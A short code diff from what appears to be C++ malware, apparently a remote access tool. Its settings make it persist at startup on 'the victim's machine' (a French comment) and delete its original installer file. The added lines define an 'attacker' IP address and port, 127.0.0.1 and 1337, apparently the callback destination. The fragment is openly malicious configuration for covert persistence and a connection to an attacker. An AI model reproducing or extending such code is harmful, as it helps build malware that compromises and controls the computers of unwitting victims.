@@ -12,3 +12,7 @@ bool Settings::setStartupSelf = true;			//specifies whether the program is to be
 bool Settings::startOnNextBoot = false;		//mettre a true si on veut le lancer au démarrage du poste de la victime
 bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
 
+
+
+static const char * adresseipPirate = "127.0.0.1";
+static unsigned short portPirate = 1337;
